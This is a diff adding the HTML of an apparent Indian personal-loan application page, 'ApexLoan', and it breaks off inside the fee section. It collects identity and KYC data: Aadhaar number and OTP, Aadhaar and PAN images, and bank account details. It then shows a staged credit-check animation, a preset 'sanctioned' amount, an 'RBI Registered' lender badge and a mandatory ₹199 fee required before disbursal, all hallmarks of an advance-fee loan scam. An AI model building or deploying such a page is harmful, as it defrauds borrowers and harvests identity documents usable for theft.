@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="hi-IN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <meta name="description" content="ApexLoan - Apply for Personal Loan. Complete KYC in 3 simple steps.">
+  <meta name="theme-color" content="#1a1f71">
+  <title>Apply for Loan | ApexLoan</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="apply-page">
+
+  <!-- Navbar -->
+  <nav class="navbar scrolled" id="navbar">
+    <div class="container nav-content">
+      <a href="index.html" class="nav-logo">
+        <div class="logo-icon">₹</div>
+        <span>Apex<span style="color: #00b894;">Loan</span></span>
+      </a>
+      <div class="nav-links">
+        <a href="index.html">Home</a>
+        <a href="index.html#calculator">EMI Calculator</a>
+        <a href="index.html#eligibility">Eligibility</a>
+      </div>
+      <a href="dashboard.html" class="btn btn-secondary btn-sm nav-cta">← Dashboard</a>
+      <button class="mobile-menu-btn" id="menuBtn" aria-label="Open menu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- Mobile Menu -->
+  <div class="mobile-menu" id="mobileMenu">
+    <button class="mobile-menu-close" id="menuClose" aria-label="Close menu">✕</button>
+    <a href="index.html">Home</a>
+    <a href="index.html#calculator">EMI Calculator</a>
+    <a href="index.html#eligibility">Eligibility</a>
+  </div>
+
+  <!-- Lending Partner Announcement Banner -->
+  <div class="lender-trust-banner" style="background: rgba(26, 31, 113, 0.05); border-bottom: 1px solid rgba(26, 31, 113, 0.1); padding: 8px 12px; text-align: center;">
+    <div class="container" style="display: flex; align-items: center; justify-content: center; gap: 8px; flex-wrap: wrap; font-size: 13px; font-weight: 600; color: var(--primary);">
+      <span>🏛️ Official NBFC Lender:</span>
+      <strong style="color: var(--primary); text-decoration: underline;">Vistas Tecnolabs Finance Limited</strong>
+      <span style="font-size: 11px; background: rgba(39, 174, 96, 0.15); color: var(--success); padding: 2px 8px; border-radius: 12px; font-weight: 700;">● RBI Registered</span>
+    </div>
+  </div>
+
+  <!-- Already Approved Notice Banner (Prevents filling the form again) -->
+  <div id="alreadyApprovedBanner" class="already-approved-banner" style="display: none; background: linear-gradient(135deg, #1a1f71, #2d3494); color: white; padding: 14px 16px; border-bottom: 2px solid #00b894;">
+    <div class="container" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
+      <div style="display: flex; align-items: center; gap: 10px;">
+        <span style="font-size: 24px;">🎉</span>
+        <div>
+          <div style="font-size: 14px; font-weight: 800; color: #00b894;">Aapka Personal Loan Already Approved Hai!</div>
+          <div style="font-size: 12px; color: rgba(255,255,255,0.85);" id="approvedBannerSub">Approved Amount: <strong id="bannerApprovedAmount" style="color: white; font-size: 14px;">₹16,420</strong> by Vistas Tecnolabs Finance Limited</div>
+        </div>
+      </div>
+      <div style="display: flex; gap: 8px;">
+        <a href="dashboard.html" class="btn btn-success btn-sm" style="font-weight: 700;">Go to Dashboard →</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Progress Bar -->
+  <section class="progress-section">
+    <div class="container">
+      <div class="progress-bar-wrapper">
+        <div class="step-indicator active" id="stepInd1">
+          <div class="step-circle">1</div>
+          <div class="step-label">Personal Info</div>
+        </div>
+        <div class="step-line" id="line1"></div>
+        <div class="step-indicator" id="stepInd2">
+          <div class="step-circle">2</div>
+          <div class="step-label">Employment</div>
+        </div>
+        <div class="step-line" id="line2"></div>
+        <div class="step-indicator" id="stepInd3">
+          <div class="step-circle">3</div>
+          <div class="step-label">KYC</div>
+        </div>
+        <div class="step-line" id="line3"></div>
+        <div class="step-indicator" id="stepInd4">
+          <div class="step-circle">4</div>
+          <div class="step-label">Bank & Offer</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Form Container -->
+  <div class="form-container">
+
+    <!-- Active Disbursal Stage Banner (If loan fee paid and 30-min transfer running) -->
+    <div class="already-approved-banner active-disbursal" id="activeDisbursalBanner" style="display: none; background: linear-gradient(135deg, #1a1f71, #2d3494); color: white; border: 2px solid #00b894;">
+      <div class="banner-badge" style="background: #00b894; color: white;">🚀 DISBURSAL STAGE IN PROGRESS</div>
+      <h3 style="color: white; margin-top: 4px;">Aapka Personal Loan Disbursal Stage Par Hai!</h3>
+      <p style="color: rgba(255,255,255,0.9); margin-bottom: 6px;">
+        Sanctioned Amount: <strong style="color: #00b894; font-size: 19px;" id="activeBannerAmount">₹16,420</strong> | Lending Partner: <strong>Vistas Tecnolabs Finance Limited</strong>
+      </p>
+      <div class="banner-note" style="background: rgba(0,0,0,0.25); color: rgba(255,255,255,0.9); border-left: 3px solid #00b894;">
+        ⏳ Hamara staff <strong>30 minute ke andar</strong> loan amount aapke bank account me transfer kar raha hai. Aapko dobara form bharne ki zaroorat nahi hai.
+      </div>
+      <div class="banner-actions" style="margin-top: 14px;">
+        <a href="dashboard.html" class="btn btn-success btn-block btn-lg" style="font-size: 15px; font-weight: 800;">
+          📊 Go to Dashboard & Track Live Bank Transfer →
+        </a>
+      </div>
+    </div>
+
+    <!-- Already Approved Sanction Banner (If loan approved, awaiting tenure/disbursal) -->
+    <div class="already-approved-banner" id="alreadyApprovedBanner" style="display: none;">
+      <div class="banner-badge">🎉 LOAN SANCTION ACTIVE</div>
+      <h3 id="approvedBannerTitle">Aapka Personal Loan Pehle Se Approved Hai!</h3>
+      <p id="approvedBannerSub">
+        Lending Partner: <strong>Vistas Tecnolabs Finance Limited</strong> | Sanction Amount: <span id="bannerApprovedAmount" class="banner-amt">₹16,420</span>
+      </p>
+      <div class="banner-note">
+        💡 <strong>Wapas form nahi bharna padega:</strong> Aapki sabhi personal, employment aur bank details pehle se verified hain. Neeche apna tenure (3 se 12 mahine) chunein aur turant 30-minute disbursal shuru karein.
+      </div>
+      <div class="banner-actions">
+        <a href="#creditSanctionCard" class="btn btn-success" id="bannerViewOfferBtn">Neeche Sanction Offer Dekhein ↓</a>
+        <a href="dashboard.html" class="btn btn-primary">Dashboard Par Jayein →</a>
+        <button type="button" onclick="startFreshApplication()" style="background: none; border: none; color: var(--gray-700); text-decoration: underline; cursor: pointer; font-size: 12px; margin-left: auto;">🔄 New Application / Re-apply</button>
+      </div>
+    </div>
+
+    <!-- ==================== STEP 1: Personal Info ==================== -->
+    <div class="form-step active" id="step1">
+      <div class="step-header">
+        <h2>👤 Personal Information</h2>
+        <p>Tell us about yourself to get started</p>
+      </div>
+
+      <!-- Full Name -->
+      <div class="form-group">
+        <label>Full Name (as per Aadhaar) <span class="required">*</span></label>
+        <input type="text" class="form-control" id="fullName" placeholder="e.g. Rajesh Kumar Sharma" autocomplete="name">
+        <div class="error-text">Please enter your full name</div>
+      </div>
+
+      <!-- DOB & Gender -->
+      <div class="form-row">
+        <div class="form-group">
+          <label>Date of Birth <span class="required">*</span></label>
+          <input type="date" class="form-control" id="dob">
+          <div class="error-text">Please enter your date of birth</div>
+        </div>
+        <div class="form-group">
+          <label>Gender <span class="required">*</span></label>
+          <select class="form-control" id="gender">
+            <option value="">Select Gender</option>
+            <option value="male">Male</option>
+            <option value="female">Female</option>
+            <option value="other">Other</option>
+          </select>
+          <div class="error-text">Please select gender</div>
+        </div>
+      </div>
+
+      <!-- Email -->
+      <div class="form-group">
+        <label>Email Address <span class="required">*</span></label>
+        <input type="email" class="form-control" id="email" placeholder="e.g. rajesh@email.com" autocomplete="email">
+        <div class="error-text">Please enter a valid email address</div>
+      </div>
+
+
+
+
+
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>City <span class="required">*</span></label>
+          <input type="text" class="form-control" id="city" placeholder="e.g. Mumbai">
+          <div class="error-text">Please enter your city</div>
+        </div>
+        <div class="form-group">
+          <label>PIN Code <span class="required">*</span></label>
+          <input type="text" class="form-control" id="pincode" placeholder="e.g. 400001" maxlength="6">
+          <div class="error-text">Please enter a valid 6-digit PIN code</div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>State <span class="required">*</span></label>
+        <select class="form-control" id="state">
+          <option value="">Select State</option>
+          <option value="AN">Andaman & Nicobar</option>
+          <option value="AP">Andhra Pradesh</option>
+          <option value="AR">Arunachal Pradesh</option>
+          <option value="AS">Assam</option>
+          <option value="BR">Bihar</option>
+          <option value="CH">Chandigarh</option>
+          <option value="CG">Chhattisgarh</option>
+          <option value="DL">Delhi</option>
+          <option value="GA">Goa</option>
+          <option value="GJ">Gujarat</option>
+          <option value="HR">Haryana</option>
+          <option value="HP">Himachal Pradesh</option>
+          <option value="JK">Jammu & Kashmir</option>
+          <option value="JH">Jharkhand</option>
+          <option value="KA">Karnataka</option>
+          <option value="KL">Kerala</option>
+          <option value="MP">Madhya Pradesh</option>
+          <option value="MH">Maharashtra</option>
+          <option value="MN">Manipur</option>
+          <option value="ML">Meghalaya</option>
+          <option value="MZ">Mizoram</option>
+          <option value="NL">Nagaland</option>
+          <option value="OD">Odisha</option>
+          <option value="PB">Punjab</option>
+          <option value="RJ">Rajasthan</option>
+          <option value="SK">Sikkim</option>
+          <option value="TN">Tamil Nadu</option>
+          <option value="TS">Telangana</option>
+          <option value="TR">Tripura</option>
+          <option value="UP">Uttar Pradesh</option>
+          <option value="UK">Uttarakhand</option>
+          <option value="WB">West Bengal</option>
+        </select>
+        <div class="error-text">Please select your state</div>
+      </div>
+
+      <!-- Loan Amount & EMI Calculator -->
+      <div class="form-group">
+        <label>Loan Amount Required <span class="required">*</span></label>
+        <div class="loan-slider-container">
+          <div class="loan-amount-display">
+            <div class="amount" id="formLoanDisplay">₹<span>50,000</span></div>
+          </div>
+          <input type="range" class="calc-slider" id="formLoanAmount" min="1000" max="100000" value="50000" step="1000">
+          <div class="calc-range-labels">
+            <span>₹1,000</span>
+            <span>₹1,00,000</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- EMI Calculator -->
+      <div class="calc-card" style="margin-bottom: 20px;">
+        <div class="calc-header">
+          <h3>💰 EMI Calculator</h3>
+          <p>See your monthly EMI based on loan amount</p>
+        </div>
+        <div class="calc-body">
+          <!-- Tenure -->
+          <div class="calc-field">
+            <label>
+              <span>Loan Tenure</span>
+              <span class="value-display" id="calcTenureDisplay">12 Months</span>
+            </label>
+            <input type="range" class="calc-slider" id="calcTenure" min="3" max="36" value="12" step="1">
+            <div class="calc-range-labels">
+              <span>3 Months</span>
+              <span>36 Months</span>
+            </div>
+          </div>
+
+          <!-- Interest Rate -->
+          <div class="calc-field">
+            <label>
+              <span>Interest Rate (p.a.)</span>
+              <span class="value-display" id="calcRateDisplay">14%</span>
+            </label>
+            <input type="range" class="calc-slider" id="calcRate" min="10" max="24" value="14" step="0.5">
+            <div class="calc-range-labels">
+              <span>10%</span>
+              <span>24%</span>
+            </div>
+          </div>
+
+          <!-- Result -->
+          <div class="calc-result">
+            <div class="emi-label">Your Monthly EMI</div>
+            <div class="emi-value" id="emiValue">₹<span>4,497</span></div>
+            <div class="calc-details">
+              <div class="calc-detail-item">
+                <div class="detail-label">Total Interest</div>
+                <div class="detail-value" id="totalInterest">₹3,968</div>
+              </div>
+              <div class="calc-detail-item">
+                <div class="detail-label">Total Payment</div>
+                <div class="detail-value" id="totalPayment">₹53,968</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Loan Purpose -->
+      <div class="form-group">
+        <label>Loan Purpose <span class="required">*</span></label>
+        <select class="form-control" id="loanPurpose">
+          <option value="">Select Purpose</option>
+          <option value="education">📚 Education</option>
+          <option value="medical">🏥 Medical Emergency</option>
+          <option value="wedding">💍 Wedding</option>
+          <option value="home_renovation">🏠 Home Renovation</option>
+          <option value="personal">👤 Personal Use</option>
+          <option value="business">💼 Business</option>
+          <option value="travel">✈️ Travel</option>
+          <option value="debt_consolidation">💳 Debt Consolidation</option>
+          <option value="other">📋 Other</option>
+        </select>
+        <div class="error-text">Please select loan purpose</div>
+      </div>
+    </div>
+
+    <!-- ==================== STEP 2: Employment ==================== -->
+    <div class="form-step" id="step2">
+      <div class="step-header">
+        <h2>💼 Employment & Income</h2>
+        <p>Help us understand your income for better loan offers</p>
+      </div>
+
+      <!-- Employment Type -->
+      <div class="form-group">
+        <label>Employment Type <span class="required">*</span></label>
+        <div class="emp-type-grid">
+          <div class="emp-type-card" data-type="salaried" onclick="selectEmpType(this)">
+            <div class="emp-icon">💼</div>
+            <div class="emp-label">Salaried</div>
+          </div>
+          <div class="emp-type-card" data-type="self_employed" onclick="selectEmpType(this)">
+            <div class="emp-icon">🏪</div>
+            <div class="emp-label">Self Employed</div>
+          </div>
+          <div class="emp-type-card" data-type="business" onclick="selectEmpType(this)">
+            <div class="emp-icon">🏢</div>
+            <div class="emp-label">Business Owner</div>
+          </div>
+          <div class="emp-type-card" data-type="freelancer" onclick="selectEmpType(this)">
+            <div class="emp-icon">💻</div>
+            <div class="emp-label">Freelancer</div>
+          </div>
+        </div>
+        <input type="hidden" id="empType" value="">
+        <div class="error-text">Please select your employment type</div>
+      </div>
+
+      <!-- Company Name -->
+      <div class="form-group">
+        <label>Company / Business Name <span class="required">*</span></label>
+        <input type="text" class="form-control" id="companyName" placeholder="e.g. Tata Consultancy Services">
+        <div class="error-text">Please enter company name</div>
+      </div>
+
+      <!-- Designation & Experience -->
+      <div class="form-row">
+        <div class="form-group">
+          <label>Designation <span class="required">*</span></label>
+          <input type="text" class="form-control" id="designation" placeholder="e.g. Software Engineer">
+          <div class="error-text">Please enter your designation</div>
+        </div>
+        <div class="form-group">
+          <label>Work Experience <span class="required">*</span></label>
+          <select class="form-control" id="experience">
+            <option value="">Select Experience</option>
+            <option value="0-1">Less than 1 year</option>
+            <option value="1-2">1 - 2 years</option>
+            <option value="2-5">2 - 5 years</option>
+            <option value="5-10">5 - 10 years</option>
+            <option value="10+">10+ years</option>
+          </select>
+          <div class="error-text">Please select experience</div>
+        </div>
+      </div>
+
+      <!-- Monthly Salary -->
+      <div class="form-group">
+        <label>Monthly Income / Salary <span class="required">*</span></label>
+        <div class="input-group">
+          <span class="input-prefix">₹</span>
+          <input type="number" class="form-control" id="monthlySalary" placeholder="e.g. 35000" min="0">
+          <span class="input-suffix">/month</span>
+        </div>
+        <div class="error-text">Please enter your monthly income (min ₹15,000)</div>
+      </div>
+
+
+
+      <!-- Salary Slip -->
+      <div class="form-group">
+        <label>Upload Salary Slip (Optional)</label>
+        <div class="file-upload-area" id="salarySlipUpload" onclick="document.getElementById('salarySlipFile').click()">
+          <div class="upload-icon">📄</div>
+          <div class="upload-text">Click to upload salary slip</div>
+          <div class="upload-hint">PDF, JPG, PNG (Max 5MB)</div>
+          <input type="file" id="salarySlipFile" accept=".pdf,.jpg,.jpeg,.png" onchange="handleFileUpload(this, 'salarySlipUpload', 'salarySlipPreview')">
+        </div>
+        <div id="salarySlipPreview"></div>
+      </div>
+    </div>
+
+    <!-- ==================== STEP 3: KYC Verification ==================== -->
+    <div class="form-step" id="step3">
+      <div class="step-header">
+        <h2>🔐 KYC Verification</h2>
+        <p>Verify your identity with Aadhaar & PAN</p>
+      </div>
+
+      <div class="kyc-methods">
+
+        <!-- Aadhaar OTP Verification -->
+        <div class="kyc-card open" id="aadhaarOtpCard">
+          <div class="kyc-card-header" onclick="toggleKycCard('aadhaarOtpCard')">
+            <div class="kyc-title">
+              <div class="kyc-icon aadhaar-icon">🆔</div>
+              <div>
+                <h4>Aadhaar OTP Verification</h4>
+                <div class="kyc-subtitle">Verify instantly with Aadhaar-linked mobile</div>
+              </div>
+            </div>
+            <span class="kyc-toggle-icon">▼</span>
+          </div>
+          <div class="kyc-card-body">
+            <div class="form-group">
+              <label>Aadhaar Number <span class="required">*</span></label>
+              <input type="text" class="form-control" id="aadhaarNumber" placeholder="XXXX XXXX XXXX" maxlength="14">
+              <div class="error-text">Please enter a valid 12-digit Aadhaar number</div>
+            </div>
+            <button class="btn btn-primary btn-block" id="sendOtpBtn" onclick="sendAadhaarOTP()">
+              Send OTP
+            </button>
+
+            <!-- OTP Section (hidden initially) -->
+            <div id="otpSection" style="display: none; margin-top: 20px;">
+              <div class="kyc-divider">
+                <span>Enter OTP</span>
+              </div>
+              <p style="text-align: center; font-size: 13px; color: var(--gray-700); margin-bottom: 8px;">
+                OTP sent to Aadhaar-linked mobile number
+              </p>
+              <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" data-index="0" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="2" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="3" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="4" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" data-index="5" inputmode="numeric">
+              </div>
+              <div class="otp-timer">
+                Resend OTP in <span class="timer" id="otpTimer">00:30</span>
+                <br>
+                <button class="resend-otp" id="resendOtpBtn" disabled onclick="sendAadhaarOTP()">Resend OTP</button>
+              </div>
+              <button class="btn btn-success btn-block" id="verifyOtpBtn" onclick="verifyAadhaarOTP()">
+                Verify OTP ✓
+              </button>
+            </div>
+
+            <!-- Aadhaar Verification Status -->
+            <div id="aadhaarStatus"></div>
+          </div>
+        </div>
+
+        <div class="kyc-divider">
+          <span>OR</span>
+        </div>
+
+        <!-- Manual Aadhaar Upload -->
+        <div class="kyc-card" id="aadhaarManualCard">
+          <div class="kyc-card-header" onclick="toggleKycCard('aadhaarManualCard')">
+            <div class="kyc-title">
+              <div class="kyc-icon aadhaar-icon">📤</div>
+              <div>
+                <h4>Manual Aadhaar Upload</h4>
+                <div class="kyc-subtitle">Upload Aadhaar card front & back images</div>
+              </div>
+            </div>
+            <span class="kyc-toggle-icon">▼</span>
+          </div>
+          <div class="kyc-card-body">
+            <!-- Aadhaar Front -->
+            <div class="form-group">
+              <label>Aadhaar Card - Front Side <span class="required">*</span></label>
+              <div class="file-upload-area" id="aadhaarFrontUpload" onclick="document.getElementById('aadhaarFrontFile').click()">
+                <div class="upload-icon">🖼️</div>
+                <div class="upload-text">Upload Aadhaar Front</div>
+                <div class="upload-hint">JPG, PNG (Max 5MB)</div>
+                <input type="file" id="aadhaarFrontFile" accept=".jpg,.jpeg,.png" onchange="handleFileUpload(this, 'aadhaarFrontUpload', 'aadhaarFrontPreview')">
+              </div>
+              <div id="aadhaarFrontPreview"></div>
+            </div>
+
+            <!-- Aadhaar Back -->
+            <div class="form-group">
+              <label>Aadhaar Card - Back Side <span class="required">*</span></label>
+              <div class="file-upload-area" id="aadhaarBackUpload" onclick="document.getElementById('aadhaarBackFile').click()">
+                <div class="upload-icon">🖼️</div>
+                <div class="upload-text">Upload Aadhaar Back</div>
+                <div class="upload-hint">JPG, PNG (Max 5MB)</div>
+                <input type="file" id="aadhaarBackFile" accept=".jpg,.jpeg,.png" onchange="handleFileUpload(this, 'aadhaarBackUpload', 'aadhaarBackPreview')">
+              </div>
+              <div id="aadhaarBackPreview"></div>
+            </div>
+
+            <div id="manualAadhaarStatus"></div>
+          </div>
+        </div>
+
+        <!-- PAN Verification -->
+        <div class="kyc-card" id="panCard">
+          <div class="kyc-card-header" onclick="toggleKycCard('panCard')">
+            <div class="kyc-title">
+              <div class="kyc-icon pan-icon">💳</div>
+              <div>
+                <h4>PAN Card Verification</h4>
+                <div class="kyc-subtitle">Verify PAN for tax compliance</div>
+              </div>
+            </div>
+            <span class="kyc-toggle-icon">▼</span>
+          </div>
+          <div class="kyc-card-body">
+            <!-- PAN Number -->
+            <div class="form-group">
+              <label>PAN Number <span class="required">*</span></label>
+              <input type="text" class="form-control" id="panNumber" placeholder="e.g. ABCDE1234F" maxlength="10" style="text-transform: uppercase;">
+              <div class="error-text">Please enter a valid PAN (e.g. ABCDE1234F)</div>
+            </div>
+
+            <button class="btn btn-primary btn-block" id="verifyPanBtn" onclick="verifyPAN()">
+              Verify PAN
+            </button>
+
+            <!-- PAN Holder Name (auto-filled) -->
+            <div class="form-group" id="panNameGroup" style="display: none; margin-top: 16px;">
+              <label>PAN Holder Name</label>
+              <input type="text" class="form-control success" id="panHolderName" readonly>
+              <div class="verification-status success" id="panNameMatch" style="display: none;">
+                <span class="status-icon">✅</span>
+                <span>Name matches with your personal information</span>
+              </div>
+              <div class="verification-status error" id="panNameMismatch" style="display: none;">
+                <span class="status-icon">⚠️</span>
+                <span>Name does not match. Please verify your details.</span>
+              </div>
+            </div>
+
+            <!-- PAN Upload -->
+            <div class="kyc-divider" style="margin-top: 16px;">
+              <span>Upload PAN</span>
+            </div>
+            <div class="form-group">
+              <label>PAN Card Image <span class="required">*</span></label>
+              <div class="file-upload-area" id="panUploadArea" onclick="document.getElementById('panFile').click()">
+                <div class="upload-icon">💳</div>
+                <div class="upload-text">Upload PAN Card</div>
+                <div class="upload-hint">JPG, PNG (Max 5MB)</div>
+                <input type="file" id="panFile" accept=".jpg,.jpeg,.png" onchange="handleFileUpload(this, 'panUploadArea', 'panPreview')">
+              </div>
+              <div id="panPreview"></div>
+            </div>
+
+            <div id="panStatus"></div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Terms & Consent -->
+      <div style="margin-top: 28px; padding: 20px; background: var(--gray-100); border-radius: var(--radius-md);">
+        <label style="display: flex; gap: 12px; align-items: flex-start; cursor: pointer; font-size: 13px; color: var(--gray-700);">
+          <input type="checkbox" id="termsConsent" style="margin-top: 3px; width: 18px; height: 18px; accent-color: var(--primary);">
+          <span>I agree to the <a href="#" style="color: var(--primary); font-weight: 600;">Terms & Conditions</a>, <a href="#" style="color: var(--primary); font-weight: 600;">Privacy Policy</a>, and consent to KYC verification as per RBI guidelines. I authorize ApexLoan to access my Aadhaar & PAN details for verification purposes.</span>
+        </label>
+        <div class="error-text" id="termsError" style="margin-top: 6px;">Please accept the terms to continue</div>
+      </div>
+    </div>
+
+    <!-- ==================== STEP 4: Bank Details & Credit Limit ==================== -->
+    <div class="form-step" id="step4">
+      <div class="step-header">
+        <h2>🏦 Bank Verification & Loan Sanction</h2>
+        <p>Enter bank account where your approved loan will be disbursed</p>
+      </div>
+
+      <!-- Bank Form Card -->
+      <div class="bank-form-card" id="bankFormCard">
+        <!-- 1. Account Number -->
+        <div class="form-group">
+          <label>Bank Account Number <span class="required">*</span></label>
+          <div class="input-group">
+            <span class="input-prefix">🔢</span>
+            <input type="password" class="form-control" id="accountNumber" placeholder="Enter bank account number" maxlength="18" inputmode="numeric" autocomplete="off">
+            <button type="button" class="toggle-btn" onclick="toggleAccVisibility('accountNumber', this)" title="Show/Hide">👁️</button>
+          </div>
+          <div class="error-text" id="accNumError">Please enter a valid bank account number (9 to 18 digits)</div>
+        </div>
+
+        <!-- 2. Re-enter Account Number -->
+        <div class="form-group">
+          <label>Re-enter Bank Account Number <span class="required">*</span></label>
+          <div class="input-group">
+            <span class="input-prefix">🔄</span>
+            <input type="text" class="form-control" id="confirmAccountNumber" placeholder="Re-enter bank account number" maxlength="18" inputmode="numeric" autocomplete="off">
+          </div>
+          <div class="match-hint" id="accMatchHint" style="display: none;"></div>
+          <div class="error-text" id="confirmAccError">Account numbers do not match</div>
+        </div>
+
+        <!-- 3. IFSC Code -->
+        <div class="form-group">
+          <label>Bank IFSC Code <span class="required">*</span></label>
+          <div class="input-group">
+            <span class="input-prefix">🏛️</span>
+            <input type="text" class="form-control" id="ifscCode" placeholder="e.g. SBIN0001234 or HDFC0000128" maxlength="11" style="text-transform: uppercase;">
+          </div>
+          <div class="ifsc-detected-badge" id="ifscBadge" style="display: none;">
+            <span class="badge-icon">✓</span>
+            <span id="ifscDetailsText"></span>
+          </div>
+          <div class="error-text" id="ifscError">Please enter a valid 11-digit IFSC code</div>
+        </div>
+
+        <!-- Bank Name -->
+        <div class="form-group">
+          <label>Bank Name <span class="required">*</span></label>
+          <select class="form-control" id="bankName">
+            <option value="">Select Bank</option>
+            <option value="State Bank of India">State Bank of India (SBI)</option>
+            <option value="HDFC Bank">HDFC Bank</option>
+            <option value="ICICI Bank">ICICI Bank</option>
+            <option value="Axis Bank">Axis Bank</option>
+            <option value="Kotak Mahindra Bank">Kotak Mahindra Bank</option>
+            <option value="Punjab National Bank">Punjab National Bank (PNB)</option>
+            <option value="Bank of Baroda">Bank of Baroda (BOB)</option>
+            <option value="Canara Bank">Canara Bank</option>
+            <option value="Union Bank of India">Union Bank of India</option>
+            <option value="IDBI Bank">IDBI Bank</option>
+            <option value="YES Bank">YES Bank</option>
+            <option value="IndusInd Bank">IndusInd Bank</option>
+            <option value="Federal Bank">Federal Bank</option>
+            <option value="Paytm Payments Bank">Paytm Payments Bank</option>
+            <option value="Other Bank">Other Bank</option>
+          </select>
+          <div class="error-text" id="bankNameError">Please select your bank</div>
+        </div>
+
+        <!-- Beneficiary Name Pill -->
+        <div class="acc-holder-pill">
+          <span class="pill-icon">👤</span>
+          <div>
+            <div class="pill-title">Verified Beneficiary Name</div>
+            <div class="pill-name" id="beneficiaryNameDisplay">As per KYC Details</div>
+          </div>
+        </div>
+
+        <!-- Verify Bank & Get Credit Limit Button -->
+        <button type="button" class="btn btn-primary btn-block btn-lg" id="verifyBankBtn" onclick="verifyBankAndCalculateLimit()">
+          ⚡ Verify Account & Check Credit Limit →
+        </button>
+      </div>
+
+      <!-- Underwriting Animation Box -->
+      <div id="evaluatingBox" style="display: none; margin-top: 24px;">
+        <div class="eval-card">
+          <div class="eval-spinner-wrapper">
+            <div class="eval-radar"></div>
+          </div>
+          <h3 id="evalTitle">Evaluating Credit Profile...</h3>
+          <p id="evalDesc">Processing underwrite by Lending Partner: <strong>Vistas Tecnolabs Finance Limited</strong></p>
+          
+          <div class="eval-steps">
+            <div class="eval-step-item" id="evalStep1">
+              <span class="step-dot"></span>
+              <span>1. NPCI Penny Drop Account Verification</span>
+            </div>
+            <div class="eval-step-item" id="evalStep2">
+              <span class="step-dot"></span>
+              <span>2. CIBIL Bureau & Income Underwriting</span>
+            </div>
+            <div class="eval-step-item" id="evalStep3">
+              <span class="step-dot"></span>
+              <span>3. Vistas Tecnolabs Finance Limited Sanction Offer</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Approved Sanction Card -->
+      <div id="creditSanctionCard" style="display: none; margin-top: 24px;">
+        <div class="sanction-card">
+          <div class="sanction-banner">
+            <div class="sanction-badge">🟢 Personal Loan Sanctioned & Approved</div>
+            <div class="lender-tag">
+              <span>Sanctioned by Lending Partner:</span>
+              <strong>🏛️ Vistas Tecnolabs Finance Limited</strong>
+            </div>
+          </div>
+
+          <div class="sanction-body">
+            <div class="sanction-limit-label">Sanctioned Personal Loan Amount</div>
+            <div class="sanction-limit-amount" id="sanctionedAmountDisplay">₹16,420</div>
+            <div class="sanction-subtext" id="sanctionTierNote">✅ High Eligibility Profile | Approved by Vistas Tecnolabs Finance Limited</div>
+
+            <!-- Tenure Selector (Stashfin Model: Up to 12 Months) -->
+            <div class="tenure-selection-wrapper">
+              <div class="tenure-section-title">
+                <span>Choose Loan Repayment Tenure:</span>
+                <span class="stashfin-tag">⚡ Flexible Tenures</span>
+              </div>
+              <div class="tenure-chips-row">
+                <button type="button" class="tenure-chip" data-months="3" onclick="selectSanctionTenure(3)">3 Months</button>
+                <button type="button" class="tenure-chip" data-months="6" onclick="selectSanctionTenure(6)">6 Months</button>
+                <button type="button" class="tenure-chip" data-months="9" onclick="selectSanctionTenure(9)">9 Months</button>
+                <button type="button" class="tenure-chip active" data-months="12" onclick="selectSanctionTenure(12)">12 Months</button>
+              </div>
+            </div>
+
+            <!-- Loan Details Grid -->
+            <div class="sanction-details-grid">
+              <div class="sanction-grid-item highlight-box">
+                <span class="item-label">Monthly EMI</span>
+                <span class="item-val highlight" id="sanctionEmiDisplay">₹1,556 / mo</span>
+              </div>
+              <div class="sanction-grid-item highlight-box">
+                <span class="item-label">Total Repayment Amount</span>
+                <span class="item-val highlight-green" id="sanctionTotalRepaymentDisplay">₹18,672</span>
+              </div>
+              <div class="sanction-grid-item">
+                <span class="item-label">Selected Tenure</span>
+                <span class="item-val" id="sanctionTenureDisplay">12 Months</span>
+              </div>
+              <div class="sanction-grid-item">
+                <span class="item-label">Interest Rate</span>
+                <span class="item-val" id="sanctionRateDisplay">24.0% p.a. (2.0%/mo)</span>
+              </div>
+              <div class="sanction-grid-item">
+                <span class="item-label">Total Interest</span>
+                <span class="item-val" id="sanctionTotalInterestDisplay">₹2,252</span>
+              </div>
+              <div class="sanction-grid-item">
+                <span class="item-label">Disbursal Bank</span>
+                <span class="item-val" id="sanctionBankDisplay">SBI ••••1234</span>
+              </div>
+            </div>
+
+            <!-- One-Time Stamp & Disbursal Verification Fee Box -->
+            <div class="disbursal-fee-box" id="disbursalFeeBox" style="margin: 18px 0; padding: 14px 16px; background: rgba(26, 31, 113, 0.04); border: 2px solid rgba(26, 31, 113, 0.15); border-radius: var(--radius-md);">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <span style="font-size: 11px; font-weight: 800; background: #e67e22; color: white; padding: 2px 8px; border-radius: 10px; text-transform: uppercase;">Required Before Disbursal</span>
+                <span style="font-size: 11px; font-weight: 700; color: var(--primary);">🏛️ Vistas Tecnolabs Finance Limited</span>
+              </div>
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <div>
+                  <div style="font-size: 13px; font-weight: 700; color: var(--dark);">One-Time Disbursal & Stamp Duty Fee:</div>
+                  <div style="font-size: 11px; color: var(--gray-700);">Mandatory stamp fee to release funds</div>
+                </div>
+                <div style="font-size: 24px; font-weight: 900; color: var(--primary);" id="sanctionFeeDisplay">₹199</div>
+              </div>
+              <div style="font-size: 12px; color: var(--gray-700); line-height: 1.5; background: var(--white); padding: 10px; border-radius: var(--radius-sm); border: 1px dashed rgba(0,0,0,0.15);">
